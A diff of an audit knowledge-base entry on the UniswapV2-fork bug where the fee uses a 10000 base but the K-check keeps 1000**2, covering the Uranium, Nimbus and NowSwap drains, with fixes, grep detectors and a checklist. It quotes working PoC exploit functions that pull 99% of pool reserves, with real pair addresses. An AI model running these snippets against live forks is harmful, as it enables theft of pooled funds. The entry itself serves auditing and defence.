@@ -1,341 +1,359 @@
 ---
-protocol: amm
+# Core Classification
+protocol: generic
 chain: ethereum, bsc
 category: amm_calculation
 vulnerability_type: k_invariant_miscalculation
 
-attack_type: constant_product_bypass
-affected_component: swap_fee_calculation, k_check
+# Pattern Identity
+root_cause_family: arithmetic_invariant_break
+pattern_key: fee_base_k_check_mismatch | swap_function | constant_product_bypass | pool_drain
 
+# Interaction Scope
+interaction_scope: single_contract
+involved_contracts:
+  - UniswapV2Pair_fork
+path_keys:
+  - fee_base_k_check_mismatch | swap() | UraniumPair
+  - fee_base_k_check_mismatch | swap() | NimbusPair
+  - fee_base_k_check_mismatch | swap() | NowSwapPair
+
+# Attack Vector Details
+attack_type: arithmetic_exploit
+affected_component: swap_k_invariant_check
+
+# Technical Primitives
 primitives:
   - k_invariant_mismatch
   - fee_constant_mismatch
-  - swap_output_overflow
+  - balance_adjusted_scaling
   - constant_product_bypass
 
+# Grep / Hunt-Card Seeds
+code_keywords:
+  - "balance0Adjusted"
+  - "balance1Adjusted"
+  - "1000**2"
+  - "10000"
+  - ".mul(10000)"
+  - ".mul(1000)"
+  - "UraniumSwap: K"
+  - "Nimbus: K"
+  - "FEE_DENOMINATOR"
+  - "K_SCALE_FACTOR"
+  - "getReserves"
+  - "amount0In"
+  - "amount1In"
+
+# Impact Classification
 severity: critical
 impact: fund_loss
-exploitability: 0.9
+exploitability: 0.95
 financial_impact: critical
 
+# Context Tags
 tags:
   - amm
   - constant_product
   - k_invariant
-  - fee_calculation
-  - swap_bug
-  - Uranium
-  - Nimbus
-  - NowSwap
-  - real_exploit
+  - uniswapv2_fork
   - DeFiHackLabs
 
-source: DeFiHackLabs
-total_exploits_analyzed: 3
-total_losses: "$50M+"
+language: solidity
+version: ">=0.6.0"
 ---
 
-## DeFiHackLabs AMM Calculation Errors Compendium
+## References & Source Reports
 
-### Overview
+| Label | Source | Path / URL |
+|-------|--------|------------|
+| [URANIUM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2021-04/Uranium_exp.sol` |
+| [NIMBUS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2021-09/Nimbus_exp.sol` |
+| [NOWSWAP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2021-09/NowSwap_exp.sol` |
 
-AMM calculation errors in constant-product (x*y=k) implementations are among the most devastating DeFi bugs because they undermine the fundamental swap invariant. This entry catalogs **3 real-world exploits** from 2021 totaling **$50M+ in losses**. The core pattern: a mismatch between the constant used in the K-invariant check and the constant used in the fee calculation creates a 100x gap that allows draining pool reserves.
+---
 
-### Root Cause: The 1000 vs 10000 Bug
+# UniswapV2 Fork K-Invariant Mismatch (Fee Base vs K-Check Base)
 
-UniswapV2's swap function uses a K-invariant check with adjustment for 0.3% swap fees:
+## Overview
+
+UniswapV2 forks that changed the swap fee from `3/1000` to `N/10000` but forgot to update the K-invariant check from `1000**2` to `10000**2` create a **100x gap** in the swap invariant. This allows an attacker to extract ~99% of every pool's reserves with minimal input in a single atomic transaction. Three protocols were drained in 2021 for **$50M+ combined losses**.
+
+### Agent Quick View
+
+| Field | Value |
+|-------|-------|
+| Root Cause | Fee adjustment uses `10000` base but K-check still uses `1000**2` — 100x permissiveness gap |
+| Pattern Key | `fee_base_k_check_mismatch \| swap_function \| constant_product_bypass \| pool_drain` |
+| Severity | CRITICAL |
+| Interaction Scope | `single_contract` — entire exploit is within the Pair contract's `swap()` |
+| Trigger | Any `swap()` call with minimal input requesting ~99% of output reserve |
+| Sink | Complete pool drainage — attacker extracts nearly all reserves |
+| Validation Strength | strong — mathematical proof, 3 independent real-world exploits |
+
+### Contract / Boundary Map
+
+```
+Attacker → Pair.swap(amount0Out, amount1Out, to, data)
+             ├── balanceOf(token0), balanceOf(token1)  ← current balances
+             ├── balance0Adjusted = balance0 * 10000 - amount0In * FEE
+             ├── balance1Adjusted = balance1 * 10000 - amount1In * FEE
+             └── require(b0Adj * b1Adj >= r0 * r1 * 1000**2)  ← BUG: should be 10000**2
+```
+
+### Valid Bug Signals
+
+1. `swap()` function contains `balance.mul(10000)` but K-check uses `mul(1000**2)` or `mul(1000000)`
+2. Fee numerator changed from `3` to any other value AND fee denominator changed from `1000` to `10000`
+3. K-check right side uses a squared constant that doesn't match the adjustment base on the left side
+4. Comment says "UniswapV2 fork" or imports UniswapV2 code with modified fee parameters
+
+### False Positive Guards
+
+1. Not this bug when fee base and K-check base use the same constant (e.g., both `1000` or both `10000`)
+2. Not this bug when `FEE_DENOMINATOR` is used as a named constant in both the fee adjustment and the K-check
+3. Safe if the protocol uses unmodified UniswapV2 code (`3/1000` fee with `1000**2` K-check)
+4. Safe if a separate `_kCheck()` helper enforces `K_SCALE_FACTOR = FEE_DENOMINATOR`
+
+---
+
+## Root Cause
+
+UniswapV2's original swap function uses `1000` as both the fee denominator and the K-check base:
 
 ```solidity
-// UniswapV2 reference (CORRECT):
-// Fee: 0.3% → multiply by 997/1000
-// K-check: (balance0 * 1000 - amountIn0 * 3) * (balance1 * 1000 - amountIn1 * 3) >= k * 1000 * 1000
-uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
+// UniswapV2 ORIGINAL (CORRECT):
+uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));  // fee = 3/1000 = 0.3%
 uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
 require(balance0Adjusted.mul(balance1Adjusted) >= _reserve0.mul(_reserve1).mul(1000**2));
+//                                                                              ^^^^^^
+//                                                                    matches the 1000 above ✓
 ```
 
-The forks in this entry changed the fee from `3/1000` to `16/10000` (0.16%) but only updated the fee numerator to 16 — they forgot to change `1000` to `10000` in the K-check. This creates a **100x** gap in the invariant check.
+Forks changed the fee to `N/10000` but only updated the left side:
+
+```solidity
+// FORK (VULNERABLE):
+uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));  // fee = 16/10000 = 0.16%
+uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));
+require(balance0Adjusted.mul(balance1Adjusted) >= _reserve0.mul(_reserve1).mul(1000**2));
+//      ^^^^^^^^^^^^^^^^ scaled by 10000                                        ^^^^^^
+//                                                                    still 1000 — 100x mismatch!
+```
+
+**Mathematical consequence**: Left side is `10000^2 = 100,000,000x` larger per unit. Right side only requires `1000^2 = 1,000,000x`. The K-check is effectively `K_new >= K_old / 100`, letting the attacker extract ~99% of reserves.
 
 ---
 
-### Vulnerable Pattern Examples
+## Path Variants
 
-#### The Core Bug: K-Constant Mismatch [CRITICAL]
+### Path A: Direct Swap Drain (Uranium — $50M, Apr 2021) `[atomic]`
 
-**Example 1: Uranium Finance — 100x K-Check Gap ($50M, 2021-04)** [CRITICAL]
+> **pathShape**: `atomic` — single `swap()` call drains the pool
+
+**Entry**: `UraniumPair.swap(0, drainAmount, attacker, "")` on BSC  
+**Fork Block**: 6,920,000  
+**Fee Config**: 16/10000 = 0.16%
+
+**Setup**: None — any pool is instantly drainable.
+
+**Firing**:
+1. Attacker sends 1 WBNB to the Pair contract
+2. Calls `swap(0, reserve1 * 99/100, attacker, "")` requesting 99% of BUSD reserve
+3. K-check passes: `(reserve0+1e18)*10000 * (reserve1*0.01)*10000 >= reserve0*reserve1*1000**2` → **true** because LHS is 100x too large
+4. Pair transfers ~99% of BUSD to attacker
+
 ```solidity
-// ❌ VULNERABLE: Fee uses 10000 base but K-check still uses 1000 base
-// UniswapV2 fork with modified fee: 16/10000 = 0.16%
-
-contract UraniumPair {
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
-        // ... transfer tokens out ...
-
-        uint balance0 = IERC20(token0).balanceOf(address(this));
-        uint balance1 = IERC20(token1).balanceOf(address(this));
-
-        uint amount0In = balance0 > _reserve0 - amount0Out
-            ? balance0 - (_reserve0 - amount0Out) : 0;
-        uint amount1In = balance1 > _reserve1 - amount1Out
-            ? balance1 - (_reserve1 - amount1Out) : 0;
-
-        // Fee calculation: 16/10000 = 0.16%
-        uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));
-        uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));
-
-        // @audit CRITICAL BUG: K-check still uses 1000**2 instead of 10000**2
-        require(
-            balance0Adjusted.mul(balance1Adjusted) >=
-            uint(_reserve0).mul(_reserve1).mul(1000**2),
-            // @audit 1000**2 = 1,000,000
-            // @audit Should be 10000**2 = 100,000,000
-            // @audit The left side is 100x larger than it needs to be!
-            // @audit This means the K-check is 100x more permissive
-            'UraniumSwap: K'
-        );
-    }
-}
-
-// Attack: The 100x gap means attacker can extract ~99% of reserves
-// Left side:  balance * 10000 (scaled up 10000x)
-// Right side: reserve * 1000**2 (scaled up 1000000x BUT left is 10000*10000 = 100M)
-// Net: attacker only needs to maintain K / 100, not K
-
-// Exploit steps:
-// 1. Send 1 WBNB into the pair (minimal input)
-// 2. Request ~99.8% of BUSD reserves as output
-// 3. K-check passes because 10000-scale adjustment >> 1000-scale requirement
-// 4. Drain WBNB-BUSD pair completely
-
-function exploit() external {
-    // Flash swap: request nearly ALL reserves
-    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
-    uint256 drainAmount = uint256(reserve1) * 998 / 1000;  // 99.8% of reserves
-
-    // Send minimal input
-    WBNB.transfer(address(pair), 1 ether);
-
-    // Request maximum output — K-check passes due to 100x gap
-    pair.swap(0, drainAmount, address(this), "");
-    // @audit Successfully drains $50M from pool
+// From Uranium PoC [URANIUM-POC]:
+function takeFunds(address token0, address token1, uint256 amount) internal {
+    IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(token1, token0));
+    IERC20(token0).transfer(address(pair), amount);       // send 1 token
+    uint256 amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;  // request 99%
+    pair.swap(
+        pair.token0() == address(token1) ? amountOut : 0,
+        pair.token0() == address(token1) ? 0 : amountOut,
+        address(this), new bytes(0)
+    );
+    // @audit K-check passes due to 10000 vs 1000**2 mismatch → drains pool
 }
 ```
-- **PoC**: `DeFiHackLabs/src/test/2021-04/Uranium_exp.sol`
-- **Root Cause**: K-invariant check uses `1000**2` on the right side but fee adjustment uses `10000` on the left side. The left side is effectively 100x larger than needed, allowing near-complete reserve drainage.
 
-**Example 2: Nimbus LP — Identical 1000 vs 10000 Bug (2021-10)** [CRITICAL]
+### Path B: Flash Swap Drain (Nimbus — Sep 2021) `[atomic]`
+
+> **pathShape**: `atomic` — flash swap callback returns only 10% of borrowed amount
+
+**Entry**: `NimbusPair.swap(drainAmount, 0, attacker, data)` on Ethereum  
+**Fork Block**: 13,225,516  
+**Fee Config**: 15/10000 = 0.15%  
+**Pair**: `0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1` (USDT pair)
+
+**Firing**:
+1. Attacker calls `swap()` with non-empty `data` to trigger flash swap
+2. Pair transfers 99% of USDT reserve to attacker
+3. `NimbusCall()` callback fires — attacker returns only 10% of borrowed amount
+4. K-check passes due to identical 10000 vs 1000**2 gap
+
 ```solidity
-// ❌ VULNERABLE: Exact same bug as Uranium — copied incorrect code
-
-contract NimbusLP {
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
-        // ... standard UniV2 swap logic ...
-
-        uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(25));
-        uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(25));
-        // @audit Fee: 25/10000 = 0.25%
-
-        require(
-            balance0Adjusted.mul(balance1Adjusted) >=
-            uint(_reserve0).mul(_reserve1).mul(1000**2),
-            // @audit SAME BUG: 1000**2 instead of 10000**2
-            'Nimbus: K'
-        );
-    }
+// From Nimbus PoC [NIMBUS-POC]:
+function testExploit() public {
+    uint256 amount = IERC20(usdt).balanceOf(pair) * 99 / 100;
+    IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encodePacked(amount));
+    // @audit Flash swap — requests 99% of USDT reserve
 }
 
-// @audit Impact: Same 100x gap → can drain ~99% of each pool
+function NimbusCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+    IERC20Custom(usdt).transfer(pair, amount0 / 10);
+    // @audit Returns only 10% — K-check still passes due to 100x gap
+}
 ```
-- **PoC**: `DeFiHackLabs/src/test/2021-10/NimbusLP_exp.sol`
-- **Root Cause**: Direct code copy from Uranium or same flawed fork template. 25/10000 fee with 1000**2 K-check.
 
-**Example 3: NowSwap — Same Pattern, Different Fee (2021-08)** [HIGH]
+### Path C: Flash Swap via Fallback (NowSwap — Sep 2021) `[atomic]`
+
+> **pathShape**: `atomic` — identical pattern, uses `fallback()` as callback
+
+**Entry**: `NowSwapPair.swap(0, drainAmount, attacker, data)` on Ethereum  
+**Fork Block**: 13,225,516  
+**Pair**: `0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62` (NWETH/NBU)
+
+**Firing**:
+1. Flash swap requests 99% of NBU reserve
+2. `fallback()` returns only 10% of borrowed NBU
+3. K-check passes
+
 ```solidity
-// ❌ VULNERABLE: Yet another fork with the same 1000 vs 10000 mismatch
-
-contract NowSwapPair {
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
-        // ... transfer out ...
-
-        uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(20));
-        uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(20));
-        // @audit Fee: 20/10000 = 0.2%
-
-        require(
-            balance0Adjusted.mul(balance1Adjusted) >=
-            uint(_reserve0).mul(_reserve1).mul(1000**2),
-            // @audit SAME BUG AGAIN: 1000**2 not 10000**2
-            'NowSwap: K'
-        );
-    }
+// From NowSwap PoC [NOWSWAP-POC]:
+function testExploit() public {
+    uint256 amount = IERC20(nbu).balanceOf(pair) * 99 / 100;
+    IUniswapV2Pair(pair).swap(0, amount, address(this), abi.encodePacked(amount));
 }
-```
-- **PoC**: `DeFiHackLabs/src/test/2021-08/NowSwap_exp.sol`
 
----
-
-### Mathematical Proof of Exploitability
-
-```
-Given:
-  - Fee = F/10000 (e.g., 16/10000 for Uranium)
-  - balance_adjusted = balance * 10000 - amountIn * F
-  - K_check: balance0_adj * balance1_adj >= reserve0 * reserve1 * 1000^2
-
-For a swap with amountIn tokens of token0, requesting amountOut of token1:
-
-  Left side (simplified, one-sided swap):
-    (reserve0 + amountIn) * 10000 * (reserve1 - amountOut) * 10000
-    = 10000^2 * (reserve0 + amountIn)(reserve1 - amountOut)
-
-  Right side:
-    reserve0 * reserve1 * 1000^2
-
-  Ratio: 10000^2 / 1000^2 = 100
-
-  The check effectively requires:
-    (reserve0 + amountIn)(reserve1 - amountOut) >= reserve0 * reserve1 / 100
-
-  Instead of:
-    (reserve0 + amountIn)(reserve1 - amountOut) >= reserve0 * reserve1
-
-  Attacker can extract up to ~99% of one reserve with minimal input.
+fallback() external {
+    IERC20Custom(nbu).transfer(pair, IERC20(nbu).balanceOf(address(this)) / 10);
+    // @audit Returns 10% via fallback — K-check still 100x permissive
+}
 ```
 
 ---
 
-### Impact Analysis
+## Vulnerable Pattern
 
-#### Technical Impact
-- **Complete pool drainage**: 99%+ of reserves extractable in single transaction
-- **All pairs vulnerable**: Every trading pair on the DEX is affected
-- **Trivial exploitation**: Requires only 1 token input to drain millions
-
-#### Business Impact
-| Protocol | Loss | Fee Config | Bug |
-|----------|------|-----------|-----|
-| Uranium Finance | $50M+ | 16/10000 | K uses 1000^2 instead of 10000^2 |
-| Nimbus LP | Undisclosed | 25/10000 | Identical K mismatch |
-| NowSwap | Undisclosed | 20/10000 | Identical K mismatch |
-
----
-
-### Secure Implementation
-
-**Fix 1: Consistent Fee Base Constants**
 ```solidity
-// ✅ SECURE: Use same base constant for BOTH fee adjustment and K-check
-uint256 constant FEE_BASE = 10000;
-uint256 constant FEE = 16;  // 0.16%
-
+// ❌ VULNERABLE: Fee uses 10000 base but K-check uses 1000 base
 function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
-    // ... transfer and balance calculation ...
+    // ... transfer tokens out, calculate amountIn ...
 
-    uint balance0Adjusted = balance0.mul(FEE_BASE).sub(amount0In.mul(FEE));
-    uint balance1Adjusted = balance1.mul(FEE_BASE).sub(amount1In.mul(FEE));
-
-    // @audit K-check uses FEE_BASE**2, matching the adjustment
+    uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(FEE_NUMERATOR));
+    uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(FEE_NUMERATOR));
+    //                                  ^^^^^
     require(
         balance0Adjusted.mul(balance1Adjusted) >=
-        uint(_reserve0).mul(_reserve1).mul(FEE_BASE ** 2),
-        // @audit 10000**2 = 100,000,000 — matches left side scale
+        uint(_reserve0).mul(_reserve1).mul(1000**2),
+        //                                ^^^^^^^^ MISMATCH — should be 10000**2
         'K'
     );
 }
 ```
 
-**Fix 2: Named Constants with Invariant Comment**
+**Instantiations**:
+
+| Protocol | Fee Numerator | Fee Base | K-Check Base | Gap |
+|----------|--------------|----------|-------------|-----|
+| Uranium | 16 | 10000 | 1000**2 | 100x |
+| Nimbus | 15 | 10000 | 1000**2 | 100x |
+| NowSwap | 20 | 10000 | 1000**2 | 100x |
+
+---
+
+## Mathematical Proof
+
+$$\text{K-check}: \quad (\text{bal}_0 \cdot 10000 - \text{in}_0 \cdot F) \cdot (\text{bal}_1 \cdot 10000 - \text{in}_1 \cdot F) \geq r_0 \cdot r_1 \cdot 1000^2$$
+
+For one-sided swap (token0 in, token1 out):
+
+$$\frac{\text{LHS}}{\text{RHS}} = \frac{10000^2}{1000^2} = 100$$
+
+The attacker only needs to maintain $K_{\text{new}} \geq K_{\text{old}} / 100$, allowing extraction of ~99% of one reserve with minimal input.
+
+---
+
+## Impact Analysis
+
+| Protocol | Date | Chain | Loss | Block |
+|----------|------|-------|------|-------|
+| Uranium Finance | Apr 2021 | BSC | $50M+ | 6,920,000 |
+| Nimbus LP | Sep 2021 | Ethereum | Undisclosed | 13,225,516 |
+| NowSwap | Sep 2021 | Ethereum | Undisclosed | 13,225,516 |
+
+- **All pools on the DEX drainable** — not limited to one pair
+- **Trivial exploitation** — requires 1 wei of input token to drain millions
+- **Single-transaction atomic attack** — no setup or staging needed
+
+---
+
+## Secure Implementation
+
 ```solidity
-// ✅ SECURE: Self-documenting code prevents copy-paste errors
-
-/// @dev INVARIANT: FEE_DENOMINATOR must match K_SCALE_FACTOR
-///      If fee = N/FEE_DENOMINATOR, then K check uses FEE_DENOMINATOR^2
+// ✅ SECURE: Named constant used for both fee adjustment and K-check
 uint256 private constant FEE_DENOMINATOR = 10000;
-uint256 private constant K_SCALE_FACTOR = FEE_DENOMINATOR;  // @audit MUST equal FEE_DENOMINATOR
+uint256 private constant FEE_NUMERATOR = 16;  // 0.16%
 
-function _kCheck(uint256 b0, uint256 b1, uint256 r0, uint256 r1) internal pure {
-    require(b0.mul(b1) >= r0.mul(r1).mul(K_SCALE_FACTOR ** 2), "K violated");
+function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
+    // ... transfer and balance calculation ...
+
+    uint balance0Adjusted = balance0.mul(FEE_DENOMINATOR).sub(amount0In.mul(FEE_NUMERATOR));
+    uint balance1Adjusted = balance1.mul(FEE_DENOMINATOR).sub(amount1In.mul(FEE_NUMERATOR));
+
+    /// @dev INVARIANT: K_SCALE = FEE_DENOMINATOR — must match
+    require(
+        balance0Adjusted.mul(balance1Adjusted) >=
+        uint(_reserve0).mul(_reserve1).mul(FEE_DENOMINATOR ** 2),
+        'K'
+    );
 }
 ```
 
-**Fix 3: Use UniswapV2 Unmodified K-Check**
-```solidity
-// ✅ SECURE: If you don't need custom fees, use UniswapV2's original constants
-// 0.3% fee: fee = 3, base = 1000
-uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
-uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
-require(
-    balance0Adjusted.mul(balance1Adjusted) >=
-    uint(_reserve0).mul(_reserve1).mul(1000**2),  // @audit 1000 matches 1000 ✓
-    'UniswapV2: K'
-);
-```
-
 ---
 
-### Detection Patterns
+## Detection Patterns
 
 ```bash
-# K-invariant check with mismatched constants
-grep -rn "1000\*\*2\|1000000\b" --include="*.sol" | \
-  xargs grep -B 10 "10000\|FEE_BASE"
-# @audit If fee uses 10000 but K uses 1000**2, it's the Uranium bug
+# Find fee adjustment with 10000 base
+grep -rn "\.mul(10000)" --include="*.sol" | grep -i "balance\|adjusted"
 
-# UniswapV2 fork swap functions
-grep -rn "balance.*Adjusted.*mul.*sub" --include="*.sol" | head -20
+# Find K-check with 1000 base
+grep -rn "1000\*\*2\|1000000" --include="*.sol" | grep -i "reserve\|require"
 
-# Custom fee constants in AMM forks
-grep -rn "\.mul(10000)\|\.mul(1000)" --include="*.sol" | \
-  grep -i "balance\|adjusted\|swap"
-
-# Different constants in same function
-grep -rn "function swap" --include="*.sol" -A 30 | \
-  grep -E "(10000|1000)" | sort | uniq -c
+# Cross-reference: if BOTH match in the same file → URANIUM BUG
 ```
 
----
-
-### Audit Checklist
-
-1. **Is this a UniswapV2 fork with modified fees?** — Check if fee base was changed from 1000
-2. **Does the K-invariant check use the SAME base as the fee adjustment?** — Must be identical
-3. **Are fee constants defined as named constants?** — Prevents copy-paste mismatches
-4. **Has the swap function been modified from the original UniV2?** — Diff against canonical code
-5. **Run the math: does left-side scale factor^2 == right-side scale factor?**
+**Quick verification for any UniswapV2 fork**:
+1. Find: `balance.mul(X).sub(amountIn.mul(Y))` → note X
+2. Find: `require(... >= reserve.mul(reserve).mul(Z))` → note Z
+3. Check: `X^2 == Z` — if not, this is the bug
 
 ---
 
-### Fork Audit Quick Check
+## Audit Checklist
 
-For ANY UniswapV2 fork, immediately check:
-```
-1. Find the fee adjustment line:  balance.mul(X).sub(amountIn.mul(Y))
-2. Find the K-check line:         require(... >= reserve0.mul(reserve1).mul(Z))
-3. Verify: X^2 == Z
-   - If X = 1000 and Z = 1000000 (1000^2): ✅ Correct
-   - If X = 10000 and Z = 1000000 (1000^2): ❌ URANIUM BUG — 100x gap
-   - If X = 10000 and Z = 100000000 (10000^2): ✅ Correct
-```
+- [ ] Is this a UniswapV2 fork with modified fees?
+- [ ] Does the fee adjustment base (left side) match the K-check base (right side)?
+- [ ] Are fee constants defined as named constants shared between fee and K-check?
+- [ ] Has the `swap()` function been diffed against canonical UniswapV2 code?
 
 ---
 
-### Keywords
+## Real-World Examples
 
-- k_invariant
-- constant_product
-- fee_mismatch
-- 1000_10000_bug
-- swap_calculation
-- amm_fork
-- uniswapv2_fork
-- pool_drain
-- reserve_drain
-- fee_base_constant
-- DeFiHackLabs
+| Protocol | Date | Loss | Root Cause | PoC |
+|----------|------|------|-----------|-----|
+| Uranium Finance | Apr 2021 | $50M+ | 16/10000 fee, 1000**2 K-check | [URANIUM-POC] |
+| Nimbus LP | Sep 2021 | Undisclosed | 15/10000 fee, 1000**2 K-check | [NIMBUS-POC] |
+| NowSwap | Sep 2021 | Undisclosed | 20/10000 fee, 1000**2 K-check | [NOWSWAP-POC] |
 
 ---
 
-### Related Vulnerabilities
+## Exploit-Derived Invariants
 
-- [AMM Constant Product Vulnerabilities](../../amm/constantproduct/AMM_CONSTANT_PRODUCT_VULNERABILITIES.md)
-- [Flash Loan Attack Patterns](../../general/flash-loan-attacks/FLASH_LOAN_VULNERABILITIES.md)
+1. **K-check base must equal fee adjustment base**: If `swap()` uses `balance.mul(BASE)`, the invariant check must use `reserve.mul(reserve).mul(BASE**2)`.
+2. **Named constants prevent copy-paste mismatch**: Fee denominator and K-scale factor should be the same constant, not separate hardcoded literals.
+3. **Any UniswapV2 fork with modified fees requires a full swap-function diff** against canonical code before deployment.
